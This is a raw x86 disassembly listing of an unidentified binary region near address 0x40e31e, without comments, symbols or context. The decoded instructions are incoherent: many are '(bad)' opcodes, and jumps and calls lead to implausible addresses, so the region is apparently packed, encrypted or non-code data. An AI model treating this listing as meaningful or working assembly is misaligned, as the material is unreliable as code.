  40e31e:	mov    dh,0x40
  40e320:	ds call 0xbff9:0xc23e7b26
  40e328:	shl    DWORD PTR [esi-0x3dc156e5],cl
  40e32e:	add    cl,BYTE PTR [ebp-0xfa004d]
  40e334:	inc    ecx
  40e335:	es ret 0x8e2b
  40e339:	dec    esp
  40e33a:	aas    
  40e33b:	dec    edi
  40e33c:	jg     0x40e2f2
  40e33e:	sbb    al,dl
  40e340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e341:	mov    ah,0x2
  40e343:	or     edi,esi
  40e345:	pop    ebx
  40e346:	fadd   QWORD PTR [eax]
  40e348:	daa    
  40e349:	fsubr  st,st(0)
  40e34b:	add    edi,DWORD PTR [esi]
  40e34d:	stos   BYTE PTR es:[edi],al
  40e34e:	fcomi  st,st(7)
  40e350:	and    ebp,edx
  40e352:	jno    0x40e35b
  40e354:	add    DWORD PTR [edi+0x29],edx
  40e357:	xchg   ecx,eax
  40e358:	dec    eax
  40e359:	xor    esp,DWORD PTR [edi-0x44]
  40e35c:	jle    0x40e3b9
  40e35e:	ss xchg ecx,eax
  40e360:	xor    eax,0xe17325b3
  40e365:	stos   BYTE PTR es:[edi],al
  40e366:	adc    edx,edi
  40e368:	addr16 pop ebx
  40e36a:	push   ds
  40e36b:	xchg   ecx,eax
  40e36c:	inc    ebp
  40e36d:	mov    bl,0x51
  40e36f:	jae    0x40e33a
  40e371:	stos   BYTE PTR es:[edi],al
  40e372:	pop    ebx
  40e373:	jno    0x40e375
	...
  40e39d:	add    ah,bh
  40e39f:	test   eax,0xdcb0705
  40e3a4:	int    0xb1
  40e3a6:	add    DWORD PTR [ebx-0x55568d0b],esi
  40e3ac:	cwde   
  40e3ad:	push   es
  40e3ae:	sub    ecx,DWORD PTR [ebx+0x39]
  40e3b1:	pop    es
  40e3b2:	adc    edx,DWORD PTR [ebx-0x2f]
  40e3b5:	or     DWORD PTR [eax-0x7be42a56],edx
  40e3bb:	fcmove st,st(5)
  40e3bd:	push   es
  40e3be:	xchg   ebp,eax
  40e3bf:	push   ds
  40e3c0:	je     0x40e383
  40e3c2:	and    eax,0x704f63d4
  40e3c7:	stos   BYTE PTR es:[edi],al
  40e3c8:	mov    ch,0x6
  40e3ca:	repz dec edx
  40e3cc:	scas   al,BYTE PTR es:[edi]
  40e3cd:	push   eax
  40e3ce:	stos   BYTE PTR es:[edi],al
  40e3cf:	test   eax,0x106606a5
  40e3d4:	sbb    eax,0xa9563e04
  40e3d9:	(bad)  
  40e3da:	and    DWORD PTR [ebx],esi
  40e3dc:	addr16 mov ebx,0x90865afe
  40e3e2:	inc    ebp
  40e3e3:	mov    bl,0xd
  40e3e5:	jae    0x40e418
  40e3e7:	stos   BYTE PTR es:[edi],al
  40e3e8:	push   DWORD PTR [ebp-0x72]
  40e3eb:	out    dx,eax
  40e3ec:	std    
  40e3ed:	outs   dx,BYTE PTR ds:[esi]
  40e3ee:	cmp    BYTE PTR [ebx],cl
  40e3f0:	call   0xfeeb7093
  40e3f5:	mov    ecx,0xe174a8cd
  40e3fa:	and    eax,0x384efe2b
  40e3ff:	mov    bl,0xb4
  40e401:	jbe    0x40e403
	...
  40e42b:	add    BYTE PTR [eax-0x56],al
  40e42e:	mov    WORD PTR [edi+edi*2-0x57],fs
  40e432:	(bad)  
  40e433:	lods   eax,DWORD PTR ss:[esi]
  40e435:	test   al,0xb4
  40e437:	ins    DWORD PTR es:[edi],dx
  40e438:	cmp    ebp,DWORD PTR [edx+0x24e211fe]
  40e43e:	add    cl,ch
  40e440:	mov    esi,0xd56c0e9a
  40e445:	test   al,0xfe
  40e447:	push   cs
  40e448:	cmp    al,dh
  40e44a:	mov    ebx,0xe7aa4007
  40e44f:	aad    0xc4
  40e451:	test   eax,0xe2f9f6fe
  40e456:	std    
  40e457:	out    dx,al
  40e458:	cmp    esi,DWORD PTR [ebx-0x55bc897c]
  40e45e:	enter  0x96ab,0xa9
  40e462:	push   ebx
  40e463:	bound  esp,QWORD PTR [esi]
  40e465:	fadd   st(3),st
  40e467:	cdq    
  40e468:	cmp    BYTE PTR [edx-0x1d065102],ch
  40e46e:	std    
  40e46f:	mov    esi,0xe9005b3b
  40e474:	cmp    eax,0x66dd44d6
  40e479:	jmp    0x62fed0f1
  40e47e:	add    BYTE PTR [ecx+edx*2],dl
  40e481:	mov    dl,0x8
  40e483:	call   0xa3a93fc5
  40e488:	mov    ebx,DWORD PTR [edx]
  40e48a:	add    BYTE PTR [eax],al
  40e48c:	rcr    al,0xa
  40e48f:	call   0x40e494
	...
  40e4b8:	add    BYTE PTR [eax],al
  40e4ba:	shr    BYTE PTR ds:0x289effff,0xb8
  40e4c1:	(bad)  
  40e4c2:	nop
  40e4c3:	pop    esi
  40e4c4:	push   0x5d263e
  40e4c9:	lea    ebx,[edx+0x70fffe1d]
  40e4cf:	out    dx,eax
  40e4d0:	out    0x67,al
  40e4d2:	pusha  
  40e4d3:	pop    esi
  40e4d4:	dec    DWORD PTR [ebp-0x1e296]
  40e4da:	xor    bh,ch
  40e4dc:	std    
  40e4dd:	mov    ch,0x6f
  40e4df:	popa   
  40e4e0:	(bad)  
  40e4e1:	(bad)  
  40e4e2:	jg     0x40e518
  40e4e4:	jp     0x40e4e6
  40e4e6:	out    0x25,eax
  40e4e8:	test   DWORD PTR [ecx+esi*1-0x1fbf00a2],edi
  40e4ef:	sub    dh,al
  40e4f1:	add    bh,dl
  40e4f3:	pop    esp
  40e4f4:	lea    edx,[ebp-0x9e9b]
  40e4fa:	test   al,0x5a
  40e4fc:	adc    BYTE PTR [eax],al
  40e4fe:	xchg   edi,eax
  40e4ff:	pop    esp
  40e500:	je     0x414406
  40e506:	adc    bh,BYTE PTR [ecx]
  40e508:	ret    0x70fe
  40e50b:	pop    edi
  40e50c:	lea    eax,[edx+0x43]
  40e50f:	out    dx,eax
  40e510:	lds    sp,DWORD PTR [eax]
  40e513:	pushf  
  40e514:	(bad)  
  40e515:	out    0x13,eax
  40e517:	aad    0xfe
  40e519:	jmp    FWORD PTR [esp+ebx*1+0x75]
  40e51d:	add    al,BYTE PTR [eax]
	...
  40e547:	add    BYTE PTR [ecx+ebx*8-0x75],bh
  40e54b:	xchg   ebp,eax
  40e54c:	xchg   ebp,eax
  40e54d:	pop    esi
  40e54e:	(bad)  
  40e54f:	call   edx
  40e551:	cdq    
  40e552:	sub    dl,BYTE PTR [eax+0x2f]
  40e555:	dec    di
  40e557:	inc    ecx
  40e558:	ds mov dl,0x1a
  40e55b:	push   edx
  40e55c:	les    esi,FWORD PTR [ecx-0x5901f4fe]
  40e562:	add    bl,ch
  40e564:	xchg   ebp,eax
  40e565:	aaa    
  40e566:	outs   dx,BYTE PTR ds:[esi]
  40e567:	ret    0x3128
  40e56a:	add    al,0x8d
  40e56c:	jl     0x40e554
  40e56e:	jns    0x40e4f5
  40e570:	sar    BYTE PTR [edi],cl
  40e572:	add    al,0xff
  40e574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e575:	inc    eax
  40e576:	mov    ebx,0x8e113e40
  40e57b:	or     edx,DWORD PTR [esi]
  40e57d:	icebp  
  40e57e:	jo     0x40e57f
  40e580:	stc    
  40e581:	and    BYTE PTR [esi-0x4c],cl
  40e584:	lock push 0x10d65004
  40e58a:	jno    0x40e58b
  40e58c:	loope  0x40e5c8
  40e58e:	jle    0x40e540
  40e590:	fadd   DWORD PTR [eax-0x2799affc]
  40e596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e597:	inc    eax
  40e598:	ds push ecx
  40e59a:	dec    esi
  40e59b:	mov    al,0xc0
  40e59d:	pop    eax
  40e59e:	add    al,0xe8
  40e5a0:	inc    edi
  40e5a1:	fld    QWORD PTR [edx]
  40e5a3:	add    BYTE PTR [ebp+0x72],al
  40e5a6:	(bad)  
  40e5a7:	adc    dl,BYTE PTR [esi]
  40e5a9:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40e5ab:	inc    eax
	...
  40e5d4:	add    BYTE PTR [eax],al
  40e5d6:	ds mov ecx,0xc098b04c
  40e5dc:	add    bh,bh
  40e5de:	or     ebp,DWORD PTR [edx-0x6f748716]
  40e5e4:	add    ch,al
  40e5e6:	pop    es
  40e5e7:	or     BYTE PTR [ebx],al
  40e5e9:	dec    ebx
  40e5eb:	ss (bad) 
  40e5ed:	std    
  40e5ee:	jno    0x40e5d8
  40e5f0:	push   ebx
  40e5f1:	push   DWORD PTR [ebx+0x61ff022d]
  40e5f7:	cdq    
  40e5f8:	call   0xe99c2475
  40e5fd:	mov    BYTE PTR [ecx+0x49496457],dl
  40e603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e604:	xchg   ebp,eax
  40e605:	add    ecx,DWORD PTR [ebx+0x39038ee6]
  40e60b:	mov    ah,0xa0
  40e60d:	jge    0x40e64d
  40e60f:	pop    ebx
  40e610:	jle    0x40e5cb
  40e612:	icebp  
  40e613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e614:	jne    0x40e619
  40e616:	push   ss
  40e617:	adc    eax,0x9519035f
  40e61c:	sub    cl,BYTE PTR [esi+edi*1]
  40e61f:	adc    BYTE PTR [edx-0x10],dh
  40e622:	or     BYTE PTR [ecx],dh
  40e624:	in     eax,0xeb
  40e626:	scas   eax,DWORD PTR es:[edi]
  40e627:	leave  
  40e628:	dec    ebp
  40e629:	add    eax,DWORD PTR [ebp-0x65]
  40e62c:	mov    esp,0x3e0b8e12
  40e631:	jns    0x40e669
  40e633:	mov    bl,0x81
  40e635:	add    ah,cl
  40e637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e638:	inc    eax
  40e639:	sub    eax,DWORD PTR [eax]
	...
  40e663:	add    al,cl
  40e665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e666:	and    eax,0xe953ffcd
  40e66b:	pop    eax
  40e66c:	mov    ch,0xb7
  40e66e:	imul   ecx,eax,0x6de931c5
  40e674:	pop    edi
  40e675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e676:	jnp    0x40e683
  40e678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e679:	adc    al,0x72
  40e67b:	add    ebp,DWORD PTR [ecx+0x17ffabd4]
  40e681:	inc    ecx
  40e682:	out    dx,al
  40e683:	js     0x40e6cb
  40e685:	mov    bl,0xa5
  40e687:	add    dl,BYTE PTR [ecx-0x76d8ad5a]
  40e68d:	xor    cl,ah
  40e68f:	jmp    0x40e65b
  40e691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e692:	int    0x2
  40e694:	in     al,0x46
  40e696:	(bad)  
  40e697:	js     0x40e6df
  40e699:	mov    bl,0x91
  40e69b:	add    ch,BYTE PTR [ecx-0x5a]
  40e69e:	inc    DWORD PTR [edx+0x3a]
  40e6a1:	xor    edx,DWORD PTR [esi+0x685b030c]
  40e6a7:	daa    
  40e6a8:	fistp  WORD PTR [ebx]
  40e6aa:	add    BYTE PTR [esi+0x2847f106],bl
  40e6b0:	cmp    dh,BYTE PTR [ebx-0x59c38610]
  40e6b6:	or     ch,BYTE PTR [ecx+0x11504fa9]
  40e6bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6bd:	or     BYTE PTR [ecx-0x17],al
  40e6c0:	lea    esp,[esi-0x64da1e8c]
  40e6c6:	sti    
  40e6c7:	data16 add BYTE PTR [eax],al
	...
  40e6f2:	cmp    al,0xb3
  40e6f4:	shr    BYTE PTR [esp+edi*1-0x5a],0x69
  40e6f9:	jmp    0xa89de493
  40e6fe:	cmp    eax,0x7aa47e33
  40e703:	pop    ebx
  40e704:	push   esp
  40e706:	fwait
  40e707:	sbb    eax,0x9bd5e941
  40e70c:	(bad)  
  40e70d:	cs cmp al,0x52
  40e710:	rcr    BYTE PTR [ebp-0x6a97f4d7],0x5e
  40e717:	sbb    al,0x0
  40e719:	mov    ecx,0x108303c
  40e71e:	shl    DWORD PTR [ecx-0x345af902],cl
  40e724:	mov    esi,?
  40e726:	aas    
  40e727:	xor    DWORD PTR [eax],eax
  40e729:	cmp    DWORD PTR ds:0x28cb833,0x5b
  40e730:	push   0x805b3de9
  40e735:	shl    DWORD PTR [edi+0x33d6fed5],1
  40e73b:	fwait
  40e73c:	jae    0x40e743
  40e73e:	adc    cl,BYTE PTR [ebx]
  40e740:	call   0xfe050845
  40e745:	jmp    FWORD PTR [ecx+ebx*4+0x72]
  40e749:	adc    al,0x47
  40e74b:	aaa    
  40e74c:	je     0x40e7ab
  40e74e:	es pop edi
  40e750:	push   eax
  40e751:	push   DWORD PTR [edx]
  40e753:	push   edi
  40e754:	call   0x40e7b5
	...
  40e77d:	add    BYTE PTR [eax],al
  40e77f:	add    BYTE PTR [ebx+0xbe8ff5b],ch
  40e785:	(bad)  
  40e786:	std    
  40e787:	(bad)  
  40e788:	mov    edi,0xb8ff8d02
  40e78d:	pop    edx
  40e78e:	jne    0x40e78c
  40e790:	test   al,0x2c
  40e792:	or     al,ch
  40e794:	fst    st(5)
  40e796:	std    
  40e797:	(bad)  
  40e798:	ficomp WORD PTR [ebp-0x282dfffe]
  40e79e:	jmp    0x68ff:0xf5ab6381
  40e7a5:	aam    0x43
  40e7a7:	cld    
  40e7a8:	mov    bh,0x5b
  40e7aa:	jne    0x40e7bc
  40e7ac:	js     0x40e7da
  40e7ae:	or     al,0xe8
  40e7b0:	cmc    
  40e7b1:	and    DWORD PTR [eax],eax
  40e7b3:	add    ah,bl
  40e7b5:	cwde   
  40e7b6:	or     eax,0x5f1c85
  40e7bb:	add    BYTE PTR [eax],ah
  40e7bd:	sbb    al,0xf8
  40e7bf:	add    bh,dl
  40e7c1:	pop    eax
  40e7c2:	add    bh,al
  40e7c4:	xchg   edx,eax
  40e7c5:	lods   al,BYTE PTR ds:[esi]
  40e7c6:	std    
  40e7c7:	pop    es
  40e7c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7c9:	pop    eax
  40e7ca:	push   0x0
  40e7cc:	int    0x58
  40e7ce:	push   0x0
  40e7d0:	int    0x58
  40e7d2:	lea    eax,[ebp-0x5d]
  40e7d5:	or     BYTE PTR [ebp-0x25c6c7b],cl
  40e7db:	call   DWORD PTR [edi+0x5a]
  40e7de:	jne    0x40e7d8
  40e7e0:	push   0xe8fc2d
	...
  40e80d:	add    BYTE PTR [esi],bh
  40e80f:	inc    esi
  40e810:	jnp    0x40e812
  40e812:	ds mov ecx,0x8b3b73c2
  40e818:	nop
  40e819:	jmp    FWORD PTR [ecx-0x4e]
  40e81c:	push   0xffffff86
  40e81e:	div    BYTE PTR [edx+0x4]
  40e821:	call   ebx
  40e823:	sub    edx,0xfffdae84
  40e829:	dec    edi
  40e82a:	mov    ch,0xe2
  40e82c:	lea    eax,[edx+ecx*2-0x7101003b]
  40e833:	pusha  
  40e834:	in     al,dx
  40e835:	je     0x40e805
  40e837:	fdiv   st(7),st
  40e839:	mov    bl,al
  40e83b:	and    eax,edi
  40e83d:	(bad)  
  40e83e:	and    edx,ebx
  40e840:	retf   
  40e841:	mov    ebx,DWORD PTR [ecx]
  40e843:	xor    eax,0x3ca6006d
  40e848:	pop    esi
  40e849:	inc    ecx
  40e84a:	ds add eax,0xd09efb6
  40e850:	add    bh,bh
  40e852:	jae    0x40e7da
  40e854:	jmp    0xc389:0x1cc1cd
  40e85b:	adc    eax,0x30e1fef8
  40e860:	mov    esi,0x74d1eb
  40e865:	add    BYTE PTR [edx-0x5f],cl
  40e868:	push   0x1
  40e86a:	ds push ebp
  40e86c:	sar    esi,0x8b
  40e86f:	pop    ebp
  40e870:	clc    
  40e871:	inc    BYTE PTR [eax]
	...
  40e89b:	add    BYTE PTR [ecx-0x59f789ac],bh
  40e8a1:	fnstenv [esi+edi*8-0x144b5b57]
  40e8a8:	test   eax,0xc7e7feac
  40e8ad:	add    eax,0x5a91ff00
  40e8b2:	pushf  
  40e8b3:	hlt    
  40e8b4:	nop
  40e8b5:	mov    ds:0x570affdd,eax
  40e8ba:	(bad)  
  40e8bb:	jns    0x40e903
  40e8bd:	mov    bl,0x18
  40e8bf:	push   DWORD PTR [eax-0x5d]
  40e8c2:	lds    edi,FWORD PTR [ecx-0x4254a7]
  40e8c8:	pop    ecx
  40e8c9:	xor    eax,0xa358ff65
  40e8ce:	and    edi,esp
  40e8d0:	pushw  ds
  40e8d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8d3:	dec    DWORD PTR [eax-0x5d]
  40e8d6:	adc    eax,DWORD PTR [eax]
  40e8d8:	push   esi
  40e8d9:	rcl    DWORD PTR [eax],1
  40e8db:	add    al,0x3e
  40e8dd:	xchg   esp,eax
  40e8de:	stos   BYTE PTR es:[edi],al
  40e8df:	adc    BYTE PTR [esi],bh
  40e8e1:	or     BYTE PTR [edx-0x10],dh
  40e8e4:	mov    esi,0x20f79097
  40e8e9:	mov    ds:0xc1a4963,eax
  40e8ee:	outs   dx,BYTE PTR ds:[esi]
  40e8ef:	jns    0x40e91f
  40e8f1:	mov    ds:0x2f160fdb,al
  40e8f6:	loope  0x40e8fb
  40e8f8:	ds push esi
  40e8fa:	sub    DWORD PTR [edi],ecx
  40e8fc:	ret    
  40e8fd:	inc    ecx
  40e8fe:	call   0x40e906
	...
  40e927:	add    BYTE PTR [eax],al
  40e929:	add    BYTE PTR [esi],bh
  40e92b:	call   0x3e8:0xa2e9fbab
  40e932:	stc    
  40e933:	sbb    BYTE PTR ds:0xe95b40ff,bh
  40e939:	imul   edi,DWORD PTR [esi],0x3e69e935
  40e93f:	xor    eax,0xa77a90e9
  40e944:	mov    eax,0x15a7c290
  40e949:	push   DWORD PTR [eax-0x5986f9f5]
  40e94f:	mov    ds:0x1899ff73,al
  40e954:	add    BYTE PTR [ecx+0x3d],dh
  40e957:	pop    ebx
  40e958:	or     ebp,DWORD PTR [ecx]
  40e95a:	push   ss
  40e95b:	pop    eax
  40e95c:	jmp    0x9c2729
  40e961:	push   ecx
  40e962:	mov    eax,0x78e9411a
  40e967:	daa    
  40e968:	adc    cl,al
  40e96a:	retf   
  40e96b:	sar    esi,1
  40e96d:	(bad)  
  40e96e:	or     eax,0xb66ccfd6
  40e973:	scas   al,BYTE PTR es:[edi]
  40e974:	div    BYTE PTR [esi-0x3eadeda8]
  40e97a:	mov    ebx,0xbaa6fed1
  40e97f:	xlat   BYTE PTR ds:[ebx]
  40e980:	out    dx,eax
  40e981:	xchg   esi,eax
  40e982:	inc    eax
  40e983:	mov    eax,ds:0xa0c4b5e7
  40e988:	inc    BYTE PTR [ebx]
  40e98a:	cmp    dh,BYTE PTR ds:0x8600
	...
  40e9b8:	out    0xb1,al
  40e9ba:	idiv   BYTE PTR [esi+0x20]
  40e9bd:	mov    eax,ds:0xbc25e574
  40e9c2:	lea    ebp,[esi+0x10]
  40e9c5:	rol    DWORD PTR [ebp+edx*2+0x5efea110],cl
  40e9cc:	(bad)  
  40e9cd:	mov    ch,0xf6
  40e9cf:	push   esi
  40e9d0:	clc    
  40e9d1:	mov    ecx,0xa0f0748a
  40e9d6:	or     ch,BYTE PTR [ecx]
  40e9d8:	jno    0x40ea18
  40e9da:	push   eax
  40e9db:	jo     0x40e993
  40e9dd:	mov    ecx,0xa0d836f6
  40e9e2:	mov    ah,0x41
  40e9e4:	enter  0xfea0,0x11
  40e9e8:	cmc    
  40e9e9:	sar    esi,1
  40e9eb:	push   ds
  40e9ec:	xor    al,0x9b
  40e9ee:	jae    0x40e991
  40e9f0:	and    eax,0xf2fe005d
  40e9f5:	cmp    DWORD PTR [edx+0x16e100],eax
  40e9fb:	jmp    FWORD PTR [edx-0x4a]
  40e9fe:	cmc    
  40e9ff:	call   DWORD PTR [eax+0x3f08739f]
  40ea05:	pop    ds
  40ea06:	mov    ah,0xff
  40ea08:	mov    al,ds:0x7000022e
  40ea0d:	loopne 0x40ea75
  40ea0f:	xchg   edx,eax
  40ea10:	xor    DWORD PTR [esi],ebx
  40ea12:	add    bh,bh
  40ea14:	retf   0xf5ae
  40ea17:	inc    DWORD PTR [eax+0x8739f]
	...
  40ea45:	add    BYTE PTR [edi-0x6f004bc3],cl
  40ea4b:	add    BYTE PTR cs:[eax],al
  40ea4e:	nop
  40ea4f:	loopne 0x40eab7
  40ea51:	(bad)  
  40ea52:	add    bl,BYTE PTR [esi]
  40ea54:	add    bh,bh
  40ea56:	jmp    0x739e:0xd0fff5ae
  40ea5d:	or     BYTE PTR [edi-0x3f004bec],bh
  40ea63:	scas   eax,DWORD PTR es:[edi]
  40ea64:	push   eax
  40ea65:	mov    esp,DWORD PTR [eax-0x3c4a0262]
  40ea6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea6c:	std    
  40ea6d:	(bad)  
  40ea6e:	mov    edi,0xa0ff8b16
  40ea73:	sahf   
  40ea74:	mov    bl,0xf0
  40ea76:	push   0x1afffd9e
  40ea7b:	push   ecx
  40ea7c:	push   DWORD PTR [ebp-0x21]
  40ea7f:	mov    ah,0xdb
  40ea81:	inc    BYTE PTR [eax+0x27b5fd9e]
  40ea87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea88:	std    
  40ea89:	(bad)  
  40ea8a:	jg     0x40eafe
  40ea8c:	mov    edi,edi
  40ea8e:	and    BYTE PTR [esi-0x53d107bd],bl
  40ea94:	cld    
  40ea95:	jmp    DWORD PTR [eax]
  40ea97:	sahf   
  40ea98:	jae    0x40ea96
  40ea9a:	ds pop edx
  40ea9c:	inc    ebp
  40ea9d:	ja     0x40eadd
  40ea9f:	mov    dl,0xc9
  40eaa1:	sar    DWORD PTR [edx],0xb2
  40eaa4:	push   ebp
  40eaa5:	mov    edx,DWORD PTR [edx+0xfbc835]
	...
  40ead3:	add    BYTE PTR [edx+esi*4],ah
  40ead6:	push   0xb279122
  40eadb:	call   0xff3d152b
  40eae0:	mov    bh,0x77
  40eae2:	add    BYTE PTR [eax+0x3e],ch
  40eae5:	mov    dl,0xeb
  40eae7:	mov    ebp,0x415de7e6
  40eaec:	ds or  ah,dh
  40eaef:	pop    esp
  40eaf0:	push   DWORD PTR [ecx-0x65b98b05]
  40eaf6:	sub    dh,BYTE PTR [ecx+edx*2-0x1411950f]
  40eafd:	jb     0x40eb03
  40eaff:	dec    DWORD PTR [ebx]
  40eb01:	or     al,0x4b
  40eb03:	inc    ecx
  40eb04:	ds leave 
  40eb06:	jne    0x40eb10
  40eb08:	es and bh,dh
  40eb0b:	(bad)  
  40eb0c:	sub    DWORD PTR [edx-0x12],ecx
  40eb0f:	pop    esp
  40eb10:	jg     0x40eac4
  40eb12:	push   0x2
  40eb14:	ds mov dl,0x82
  40eb17:	dec    BYTE PTR [ebx+0xb7deaba]
  40eb1d:	cmp    esp,edi
  40eb1f:	addr16 cmp al,0xe0
  40eb22:	inc    ecx
  40eb23:	add    BYTE PTR [esi-0x4c],ah
  40eb26:	add    al,BYTE PTR [eax]
  40eb28:	mov    esi,0xd6087610
  40eb2d:	cld    
  40eb2e:	cld    
  40eb2f:	(bad)  
  40eb30:	loope  0x40eabb
  40eb32:	inc    eax
  40eb33:	pop    esi
  40eb34:	jg     0x40eae8
  40eb36:	push   0x2
	...
  40eb60:	add    BYTE PTR [eax],al
  40eb62:	ds mov dl,0x82
  40eb65:	(bad)  
  40eb66:	push   ebx
  40eb67:	pop    ebx
  40eb68:	icebp  
  40eb69:	jmp    0x40ebe1
  40eb6b:	mov    eax,ds:0x25b8fc1d
  40eb70:	adc    eax,0x1532afc
  40eb75:	push   ss
  40eb76:	mov    dh,0x9f
  40eb78:	add    eax,0xe9567fca
  40eb7d:	push   esi
  40eb7e:	lds    ebp,FWORD PTR [esi-0x4cbd8a0b]
  40eb84:	or     BYTE PTR [ebp-0x3c0e6078],cl
  40eb8a:	or     eax,0x1bbf5162
  40eb8f:	sbb    ch,cl
  40eb91:	push   ebx
  40eb92:	cs pop di
  40eb95:	sti    
  40eb96:	push   0x3e6c190a
  40eb9b:	pop    ebx
  40eb9c:	into   
  40eb9d:	mov    edx,0x4516c0e1
  40eba2:	or     ebp,DWORD PTR ds:[esi+0x3eb33671]
  40eba9:	mov    bh,0x40
  40ebab:	lahf   
  40ebac:	inc    eax
  40ebad:	ins    BYTE PTR es:[edi],dx
  40ebae:	aas    
  40ebaf:	pop    ebx
  40ebb0:	xchg   BYTE PTR [edx+0x452ef099],bh
  40ebb6:	or     eax,DWORD PTR ds:[esi+0x2ab33671]
  40ebbd:	mov    bh,0x18
  40ebbf:	lahf   
  40ebc0:	or     BYTE PTR [edi-0x3c],0x9e
  40ebc4:	ins    DWORD PTR es:[edi],dx
  40ebc5:	int    0x0
	...
  40ebef:	add    bh,bh
  40ebf1:	push   ebx
  40ebf2:	jmp    0x69f0a147
  40ebf7:	shl    ch,0x31
  40ebfa:	jmp    0xd3df096c
  40ebff:	or     edx,esi
  40ec01:	xor    BYTE PTR [esi-0x5],ch
  40ec04:	loopne 0x40ebda
  40ec06:	mov    ds:0x4167f7,eax
  40ec0b:	ss dec edi
  40ec0d:	push   ebx
  40ec0e:	call   0xfedeb167
  40ec13:	xchg   ebx,eax
  40ec14:	sbb    BYTE PTR [esi-0x2e5a0e8c],bl
  40ec1a:	(bad)  
  40ec1b:	push   ss
  40ec1c:	mov    ch,0x34
  40ec1e:	sbb    al,0xe
  40ec20:	das    
  40ec21:	push   ebx
  40ec22:	call   0xfede918f
  40ec27:	dec    BYTE PTR [esi]
  40ec29:	lahf   
  40ec2a:	(bad)  
  40ec2b:	jl     0x40ec72
  40ec2d:	mov    bl,0x86
  40ec2f:	test   WORD PTR [ebp-0x617e5438],bx
  40ec36:	push   ebx
  40ec37:	jb     0x40ec9a
  40ec39:	or     edi,eax
  40ec3b:	in     al,dx
  40ec3c:	out    dx,al
  40ec3d:	cmp    al,BYTE PTR [ecx-0x17]
  40ec40:	cmp    eax,0x10e9005b
  40ec45:	cmp    dh,0x34
  40ec48:	dec    edx
  40ec49:	mov    bl,0xc2
  40ec4b:	cmp    eax,0x148b5b3a
  40ec50:	cmp    bl,dl
  40ec52:	imul   ebx
	...
  40ec7c:	add    BYTE PTR [eax],al
  40ec7e:	iret   
  40ec7f:	dec    ebx
  40ec80:	add    edi,DWORD PTR [ecx+0xf01b3c0]
  40ec86:	mov    ebx,0xaf2d5c63
  40ec8b:	pop    eax
  40ec8c:	data16 scas al,BYTE PTR es:[edi]
  40ec8e:	cmp    edi,edi
  40ec90:	(bad)  
  40ec91:	jge    0x40ec21
  40ec93:	dec    edi
  40ec94:	call   0x9c7b8c
  40ec99:	add    DWORD PTR [eax-0x2],ebp
  40ec9c:	inc    eax
  40ec9d:	jmp    0xa89e7e37
  40eca2:	cmp    eax,0xf47d39b3
  40eca7:	pushf  
  40eca8:	or     ch,BYTE PTR [ecx]
  40ecaa:	pop    ecx
  40ecab:	cmp    bh,bh
  40ecad:	add    BYTE PTR [edx-0x62ea00af],ah
  40ecb3:	add    BYTE PTR [ecx+0x0],al
  40ecb6:	fiadd  WORD PTR fs:[edx]
  40ecb9:	or     edx,DWORD PTR [edi]
  40ecbb:	sub    edx,DWORD PTR [ebp-0x1]
  40ecbe:	ret    0x5f2f
  40ecc1:	inc    ecx
  40ecc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecc3:	hlt    
  40ecc4:	jae    0x40ed26
  40ecc6:	out    0x59,al
  40ecc8:	cmp    DWORD PTR ds:0x4139d2,0xffffff97
  40eccf:	sub    cl,BYTE PTR [eax]
  40ecd1:	push   DWORD PTR [edx+0x3]
  40ecd4:	pop    edi
  40ecd5:	inc    ecx
  40ecd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecd7:	lods   al,BYTE PTR ds:[esi]
  40ecd8:	aaa    
  40ecd9:	push   0xffffff97
  40ecdb:	das    
  40ecdc:	add    edi,edi
  40ecde:	and    ch,BYTE PTR [esi]
  40ece0:	pusha  
  40ece1:	inc    ecx
	...
  40ed0a:	add    BYTE PTR [eax],al
  40ed0c:	addr16 mov ds:0x6e13,al
  40ed10:	sub    BYTE PTR [edx],bl
  40ed12:	add    BYTE PTR [ebx-0x3ff4ad5d],al
  40ed18:	and    edi,DWORD PTR [edx-0x1]
  40ed1b:	xor    eax,0x413712
  40ed20:	mov    BYTE PTR [ebp+0x76],cl
  40ed23:	pop    edi
  40ed24:	push   ss
  40ed25:	push   edi
  40ed26:	add    esp,0x53
  40ed29:	mov    ds:0x18785e13,al
  40ed2e:	add    bh,al
  40ed30:	and    ch,BYTE PTR [esi]
  40ed32:	pusha  
  40ed33:	inc    ecx
  40ed34:	pop    ss
  40ed35:	pop    ecx
  40ed36:	add    BYTE PTR [eax],al
  40ed38:	pop    ss
  40ed39:	mov    al,0xff
  40ed3b:	inc    edx
  40ed3c:	mov    WORD PTR [esi+0x4fe5c959],ss
  40ed42:	add    BYTE PTR [ebx+0x41602dda],al
  40ed48:	pop    ss
  40ed49:	pop    ecx
  40ed4a:	je     0x40ed6b
  40ed4c:	cwde   
  40ed4d:	ins    BYTE PTR es:[edi],dx
  40ed4e:	jne    0x40edb0
  40ed50:	ds repz add bh,bh
  40ed54:	push   ebx
  40ed55:	test   BYTE PTR [edi+0x41],dl
  40ed58:	ds xor eax,eax
  40ed5b:	add    ebx,ecx
  40ed5d:	xchg   DWORD PTR [eax+0x5f],ebx
  40ed60:	jg     0x40ed14
  40ed62:	mov    edi,0x41925304
  40ed67:	add    BYTE PTR [esi],bh
  40ed69:	mov    dl,0x2
  40ed6b:	add    BYTE PTR [ebp-0x19],bh
  40ed6e:	mov    ebp,ebx
	...
